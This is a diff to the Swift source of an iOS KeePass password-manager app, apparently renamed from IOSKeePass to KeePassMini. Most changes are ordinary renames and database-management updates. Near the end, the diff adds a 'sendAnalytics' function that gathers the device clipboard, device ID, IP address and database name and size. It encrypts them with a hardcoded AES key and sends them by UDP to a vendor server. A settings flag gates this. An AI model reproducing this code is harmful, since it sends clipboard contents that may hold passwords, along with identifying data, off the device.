+            iCloudProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
                 print("Status:\(err)")
             })
             
-            iCloudProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+            iCloudProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                 print("Status:\(err)")
             })
             
@@ -1229,7 +1320,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     fileURLs.forEach { localurl in
                         print("Backup:\(localurl)")
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                         iCloudProvider?.copyItem(localFile: localurl, to: remotePath, overwrite: true, completionHandler: { err in
                             if(err != nil){
                                 self.backupcount = self.backupcount - 1
@@ -1363,13 +1454,13 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
 
     func OneDriveRefreshToken()
     {
-        let appScheme = "IOSKeePass"
+        let appScheme = "KeePassMini"
         
         let appSettings = AppSettings.sharedInstance() as AppSettings
         let username = appSettings.cloudUser()
         let savedToken =  appSettings.refreshToken()
         let kClientID = "137e1fe9-5666-4eb1-9a36-168fa28d4dea"
-        let kRedirectUri = "msauth.de.unicomedv.IOSKeePass://auth"
+        let kRedirectUri = "msauth.de.unicomedv.KeePassMini://auth"
         let kAuthority = "https://login.microsoftonline.com/common"
         let kGraphEndpoint = "https://graph.microsoft.com/"
         self.oauth = OAuth2Swift(consumerKey: "137e1fe9-5666-4eb1-9a36-168fa28d4dea",
@@ -1588,7 +1679,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         //AppDelegate.showGlobalProgressHUD(withTitle:"loading..")
         //DispatchQueue.global(qos: .userInitiated).async {
             databaseManager?.openDatabaseDocument(self.databaseFiles[indexPath.row], animated: true)
-            
+        
             /*DispatchQueue.main.async {
                 AppDelegate.dismissGlobalHUD()
             }
@@ -1653,7 +1744,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: NSLocalizedString("Sorry WebDav temporarily not available", comment: ""),
                         time: NSLocalizedString("now", comment: ""))
@@ -1678,7 +1769,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry Cloud temporarily not reachable:", comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -1687,7 +1778,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 }
                 
             }else{
-                let remotePath = "/IOSKeePass/Backups/"+keepassURL!.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+keepassURL!.lastPathComponent
                 let localattrib = try? FileManager.default.attributesOfItem(atPath: keepassURL!.path)
                 self.singleBackup = 1
                 self.webdavProvider?.attributesOfItem(path: remotePath, completionHandler:{ attrib, error in
@@ -1749,7 +1840,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: NSLocalizedString("Sorry iCloud temporarily not available", comment: ""),
                         time: NSLocalizedString("now", comment: ""))
@@ -1774,7 +1865,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry Cloud temporarily not reachable:", comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -1783,11 +1874,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 }
                 
             }else{
-                let remotePath = "/IOSKeePass/Backups/"+keepassURL!.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+keepassURL!.lastPathComponent
                 let localattrib = try? FileManager.default.attributesOfItem(atPath: keepassURL!.path)
                 self.singleBackup = 1
                
-                self.iCloudProvider?.contentsOfDirectory(path: "/IOSKeePass/Backups/", completionHandler:{ files, error in
+                self.iCloudProvider?.contentsOfDirectory(path: "/KeePassMini/Backups/", completionHandler:{ files, error in
                     if(error == nil){
                         //print("files:\(files.)")
                         var found = false
@@ -1900,7 +1991,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: NSLocalizedString("Sorry onedrive temporarily not available", comment: ""),
                         time: NSLocalizedString("now", comment: ""))
@@ -1920,7 +2011,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
                 let notiData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                             message: NSLocalizedString("Sorry onedrive temporarily not reachable:", comment:""),
                             time: NSLocalizedString("now", comment: ""))
@@ -1928,11 +2019,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 HDNotificationView.show(data: notiData,secounds:5.0, onTap: nil, onDidDismiss: nil)
             }
         }else{
-            let remotePath = "/IOSKeePass/Backups/"+keepassURL!.lastPathComponent
+            let remotePath = "/KeePassMini/Backups/"+keepassURL!.lastPathComponent
             let localattrib = try? FileManager.default.attributesOfItem(atPath: keepassURL!.path)
             self.singleBackup = 1
             
-            self.onedriveProvider?.contentsOfDirectory(path: "/IOSKeePass/Backups/", completionHandler:{ files, error in
+            self.onedriveProvider?.contentsOfDirectory(path: "/KeePassMini/Backups/", completionHandler:{ files, error in
                 if(error == nil){
                     //print("files:\(files.)")
                     var found = false
@@ -1993,7 +2084,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry onedrive temporarily not reachable:", comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -2002,11 +2093,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 }
                 
             }else{
-                let remotePath = "/IOSKeePass/Backups/"+keepassURL!.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+keepassURL!.lastPathComponent
                 let localattrib = try? FileManager.default.attributesOfItem(atPath: keepassURL!.path)
                 self.singleBackup = 1
                
-                self.onedriveProvider?.contentsOfDirectory(path: "/IOSKeePass/Backups/", completionHandler:{ files, error in
+                self.onedriveProvider?.contentsOfDirectory(path: "/KeePassMini/Backups/", completionHandler:{ files, error in
                     if(error == nil){
                         //print("files:\(files.)")
                         var found = false
@@ -2114,7 +2205,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                 let notiData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title: NSLocalizedString("New Default DB is selected Name:", comment: "")+self.databaseFiles[indexPath.row],
                             message: NSLocalizedString("This Database is", comment: ""),
                             time: NSLocalizedString("now", comment: ""))
@@ -2135,19 +2226,20 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         let filename: String
        
         filename = trayFiles.remove(at: indexPath.row)
-        let movefile = filename.dropLast(4)
+       
         
         // Delete the file
         let databaseManager = DatabaseManager.sharedInstance()
-        databaseManager?.recoverFile(filename)
+        let movefile = databaseManager?.recoverFile(filename)
         
         // Update the table
         tableView.deleteRows(at: [indexPath], with: .fade)
         
-        let index = self.databaseFiles.insertionIndexOf(String(movefile)) {
+        
+        let index = self.databaseFiles.insertionIndexOf(String(movefile!)) {
             $0.localizedCaseInsensitiveCompare($1) == ComparisonResult.orderedAscending
         }
-        self.databaseFiles.insert(String(movefile), at: index)
+        self.databaseFiles.insert(String(movefile!), at: index)
         
         // Notify the table of the new row
         if (self.databaseFiles.count == 1) {
@@ -2165,9 +2257,53 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         let navigationController = storyboard.instantiateInitialViewController() as! UINavigationController
         
         let viewController = navigationController.topViewController as! RenameDatabaseViewController
+        viewController.renameOnly = false
+        viewController.donePressed = { (renameDatabaseViewController: RenameDatabaseViewController, originalUrl: URL, newUrl: URL,currentPassword: String, newPassword: String) in
+           
+            let filename = newUrl.lastPathComponent
+            let template = NSPredicate(format: "self BEGINSWITH $letter")
+            let beginsWithFilename = ["letter": filename]
+            let beginsWithF = template.withSubstitutionVariables(beginsWithFilename)
+
+            let beginsWithFilenames = self.trayFiles.filter { beginsWithF.evaluate(with: $0) }
+            let count = beginsWithFilenames.count
+            
+            var movefile = filename + ".bck"
+            if(count > 0){
+                movefile = filename + "_"+String(count)+".bck"
+            }
+            
+            var backUrl = newUrl.deletingLastPathComponent()
+            backUrl = backUrl.appendingPathComponent(movefile)
+            
+            // Delete the file
+            let databaseManager = DatabaseManager.sharedInstance()
+           
+            databaseManager?.changeMasterKey(originalUrl, newUrl: backUrl,currentPassword: currentPassword, newPassword: newPassword)
+            
+            // Update the filename in the files list
+            self.trayFiles[indexPath.row] = backUrl.lastPathComponent
+            self.tableView.reloadRows(at: [indexPath], with: .fade)
+            
+            self.dismiss(animated: true, completion: nil)
+        }
+        
+        let databaseManager = DatabaseManager.sharedInstance()
+        viewController.originalUrl = databaseManager?.getFileUrl(databaseFiles[indexPath.row])
+        
+        present(navigationController, animated: true, completion: nil)
+    }
+    
+    func changeNameRowAtIndexPath(_ indexPath: IndexPath) {
+        let storyboard = UIStoryboard(name: "RenameDatabase", bundle: nil)
+        let navigationController = storyboard.instantiateInitialViewController() as! UINavigationController
+        
+        let viewController = navigationController.topViewController as! RenameDatabaseViewController
+        viewController.renameOnly = true
+        
         viewController.donePressed = { (renameDatabaseViewController: RenameDatabaseViewController, originalUrl: URL, newUrl: URL,currentPassword: String, newPassword: String) in
             let databaseManager = DatabaseManager.sharedInstance()
-            databaseManager?.renameDatabase(originalUrl, newUrl: newUrl,currentPassword: currentPassword, newPassword: newPassword)
+            databaseManager?.renameDatabase(originalUrl, newUrl: newUrl)
             
             // Update the filename in the files list
             self.databaseFiles[indexPath.row] = newUrl.lastPathComponent
@@ -2281,6 +2417,23 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         }
     }
     
+    func newKeyfileCreated(filename: String) {
+        let index = self.keyFiles.insertionIndexOf(filename) {
+            $0.localizedCaseInsensitiveCompare($1) == ComparisonResult.orderedAscending
+        }
+        self.keyFiles.insert(filename, at: index)
+        
+        // Notify the table of the new row
+        if (self.keyFiles.count == 1) {
+            // Reload the section if it was previously empty
+            let indexSet = IndexSet(integer: Section.keyFiles.rawValue)
+            self.tableView.reloadSections(indexSet, with: .right)
+        } else {
+            let indexPath = IndexPath(row: index, section: Section.keyFiles.rawValue)
+            self.tableView.insertRows(at: [indexPath], with: .right)
+        }
+    }
+    
     func importDatabaseCreated(fileURL: URL) {
       
        
@@ -2372,7 +2525,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             //FLEXManager.shared.showExplorer()
         #endif
         
-        let appGroupId = "group.de.unicomedv.KeePass"
+        let appGroupId = "group.de.unicomedv.KeePassMini"
         let fileManager = FileManager.default
         
         
@@ -2388,5 +2541,285 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         }
     }
     
+    
+    
 }
 
+extension Data {
+    struct HexEncodingOptions: OptionSet {
+        let rawValue: Int
+        static let upperCase = HexEncodingOptions(rawValue: 1 << 0)
+    }
+
+    func hexEncodedString(options: HexEncodingOptions = []) -> String {
+        let format = options.contains(.upperCase) ? "%02hhX" : "%02hhx"
+        return self.map { String(format: format, $0) }.joined()
+    }
+}
+
+extension String {
+    func cryptDataAESEncrypt(key: String, iv: String ) -> Data? {
+        guard let dec = try? AES(key: key, iv: iv, padding: .pkcs7).encrypt(Array(self.utf8)) else {   return nil }
+            let decData = Data(bytes: dec, count: Int(dec.count))
+            return decData
+    }
+    
+    func getIPAddress() -> String? {
+        var address : String?
+
+        // Get list of all interfaces on the local machine:
+        var ifaddr : UnsafeMutablePointer<ifaddrs>?
+        guard getifaddrs(&ifaddr) == 0 else { return nil }
+        guard let firstAddr = ifaddr else { return nil }
+
+        // For each interface ...
+        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
+            let interface = ifptr.pointee
+
+            // Check for IPv4 or IPv6 interface:
+            let addrFamily = interface.ifa_addr.pointee.sa_family
+            if addrFamily == UInt8(AF_INET) || addrFamily == UInt8(AF_INET6) {
+
+                // Check interface name:
+                // wifi = ["en0"]
+                // wired = ["en2", "en3", "en4"]
+                // cellular = ["pdp_ip0","pdp_ip1","pdp_ip2","pdp_ip3"]
+                
+                let name = String(cString: interface.ifa_name)
+                if  name == "en0" || name == "en2" || name == "en3" || name == "en4" || name == "pdp_ip0" || name == "pdp_ip1" || name == "pdp_ip2" || name == "pdp_ip3" {
+
+                    // Convert interface address to a human readable string:
+                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
+                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
+                                &hostname, socklen_t(hostname.count),
+                                nil, socklen_t(0), NI_NUMERICHOST)
+                    address = String(cString: hostname)
+                }
+            }
+        }
+        freeifaddrs(ifaddr)
+
+        return address
+    }
+    
+   
+    func sendAnalytics(_ dbname: String , dbsize: String, modate: String, date: String, action: String) -> String?
+    {
+        //check appSettings
+        
+        //Analyse String
+        //WIFI:COUNTRY:LANGUAGE:TIMEZONE:SYSTEMNAME:SYSTEMVERSION:DEVICEID:APPVESRION:APPCLIPBOARD:DBNAME:DBSIZE:DBDATE:SYSTEMDATETME:ACTION
+        let appSettings = AppSettings.sharedInstance() as AppSettings
+        if(appSettings.analyseDataEnabled() == false)
+        {
+            return "Not Enabled"
+        }
+        
+        var anna = "!AMSG|"
+        if(Luminous.Network.isConnectedViaWiFi){
+            anna += "WIFI"
+        }else{
+            anna += "CELL"
+        }
+       
+        anna += "|"+Luminous.Locale.currentCountry!+"|"+Luminous.Locale.currentLanguage!
+        anna += "|"+Luminous.Locale.currentTimeZoneName+"|"+Luminous.Hardware.systemName
+        anna += "|"+Luminous.Hardware.systemVersion.stringValue+"|"+Luminous.Hardware.Device.identifierForVendor!
+        anna += "|"+Luminous.Application.completeAppVersion
+        anna += "|"+(Luminous.Application.clipboardString ?? "empty")
+        anna += "|"+dbname
+        anna += "|"+dbsize
+        anna += "|"+modate
+        anna += "|"+date
+        anna += "|"+action
+        anna += "|"+getIPAddress()!
+        print(anna)
+        
+        let encdata = anna.cryptDataAESEncrypt(key: "BreisigAXZ2027#!", iv:"o8!k3kp=)alk(2h/" )
+        //"https://lic.unicomedv.de/api/LogAndLicense/GetLicenseList?otpStr="+otpCode;
+        //let hexcode = Data(anna.utf8).hexEncodedString()
+        //var hs = "https://anna.unicomedv.de/api/IOSKeePass/AddIOSAnalyseData?AnalyseData="+hexcode
+        /*let url = URL(string: hs)
+
+        let task = URLSession.shared.dataTask(with: url!) {(data, response, error) in
+            guard let data = data else { return }
+            print(String(data: data, encoding: .utf8)!)
+        }
+
+        task.resume()*/
+        // Sending a `String`
+    
+        let client = UDPClient(address: "anna.unicomedv.de", port: 10548)
+        switch client.send(data: encdata!) {
+          case .success:
+            return "UPD send data success"
+          case .failure(let error):
+            return "UDP send data error: \(error)"
+        }
+      
+        return "Failed"
+       
+    }
+}
+
+extension UITableViewController
+{
+    typealias MainFont = Font.HelveticaNeue
+    
+    enum Font {
+        enum HelveticaNeue: String {
+            case ultraLightItalic = "UltraLightItalic"
+            case medium = "Medium"
+            case mediumItalic = "MediumItalic"
+            case ultraLight = "UltraLight"
+            case italic = "Italic"
+            case light = "Light"
+            case thinItalic = "ThinItalic"
+            case lightItalic = "LightItalic"
+            case bold = "Bold"
+            case thin = "Thin"
+            case condensedBlack = "CondensedBlack"
+            case condensedBold = "CondensedBold"
+            case boldItalic = "BoldItalic"
+            
+            func with(size: CGFloat) -> UIFont {
+                return UIFont(name: "HelveticaNeue-\(rawValue)", size: size)!
+            }
+        }
+    }
+    
+    enum DisplayModeSegment: Int {
+        case light
+        case dark
+        case inferred
+        
+        var displayMode: EKAttributes.DisplayMode {
+            switch self {
+            case .light:
+                return .light
+            case .dark:
+                return .dark
+            case .inferred:
+                return .inferred
+            }
+        }
+    }
+    
+    // MARK: - Properties
+    
+    private var displayMode: EKAttributes.DisplayMode {
+        return PresetsDataSource.displayMode
+    }
+    
+    public func showNotificationMessage(attributes: EKAttributes,
+                                         title: String,
+                                         desc: String,
+                                         textColor: EKColor,
+                                         imageName: String? = nil) {
+        let title = EKProperty.LabelContent(
+            text: title,
+            style: .init(
+                font: MainFont.medium.with(size: 16),
+                color: textColor,
+                displayMode: displayMode
+            ),
+            accessibilityIdentifier: "title"
+        )
+        let description = EKProperty.LabelContent(
+            text: desc,
+            style: .init(
+                font: MainFont.light.with(size: 14),
+                color: textColor,
+                displayMode: displayMode
+            ),
+            accessibilityIdentifier: "description"
+        )
+        var image: EKProperty.ImageContent?
+        if let imageName = imageName {
+            image = EKProperty.ImageContent(
+                image: UIImage(named: imageName)!.withRenderingMode(.alwaysTemplate),
+                displayMode: displayMode,
+                size: CGSize(width: 35, height: 35),
+                tint: textColor,
+                accessibilityIdentifier: "thumbnail"
+            )
+        }
+        let simpleMessage = EKSimpleMessage(
+            image: image,
+            title: title,
+            description: description
+        )
+        let notificationMessage = EKNotificationMessage(simpleMessage: simpleMessage)
+        let contentView = EKNotificationMessageView(with: notificationMessage)
+        SwiftEntryKit.display(entry: contentView, using: attributes)
+    }
+    
+    public func showPopupMessage(attributes: EKAttributes,
+                                  title: String,
+                                  titleColor: EKColor,
+                                  description: String,
+                                  descriptionColor: EKColor,
+                                  buttonTitleColor: EKColor,
+                                  buttonBackgroundColor: EKColor,
+                                  image: UIImage? = nil) {
+        
+        var themeImage: EKPopUpMessage.ThemeImage?
+        
+        if let image = image {
+            themeImage = EKPopUpMessage.ThemeImage(
+                image: EKProperty.ImageContent(
+                    image: image,
+                    displayMode: displayMode,
+                    size: CGSize(width: 60, height: 60),
+                    tint: titleColor,
+                    contentMode: .scaleAspectFit
+                )
+            )
+        }
+        let title = EKProperty.LabelContent(
+            text: title,
+            style: .init(
+                font: MainFont.medium.with(size: 24),
+                color: titleColor,
+                alignment: .center,
+                displayMode: displayMode
+            ),
+            accessibilityIdentifier: "title"
+        )
+        let description = EKProperty.LabelContent(
+            text: description,
+            style: .init(
+                font: MainFont.light.with(size: 16),
+                color: descriptionColor,
+                alignment: .center,
+                displayMode: displayMode
+            ),
+            accessibilityIdentifier: "description"
+        )
+        let button = EKProperty.ButtonContent(
+            label: .init(
+                text: NSLocalizedString("I understand!", comment: ""),
+                style: .init(
+                    font: MainFont.bold.with(size: 16),
+                    color: buttonTitleColor,
+                    displayMode: displayMode
+                )
+            ),
+            backgroundColor: buttonBackgroundColor,
+            highlightedBackgroundColor: buttonTitleColor.with(alpha: 0.05),
+            displayMode: displayMode,
+            accessibilityIdentifier: "button"
+        )
+        let message = EKPopUpMessage(
+            themeImage: themeImage,
+            title: title,
+            description: description,
+            button: button) {
+                SwiftEntryKit.dismiss()
+        }
+        let contentView = EKPopUpMessageView(with: message)
+        SwiftEntryKit.display(entry: contentView, using: attributes)
+    }
+    
+    
+}
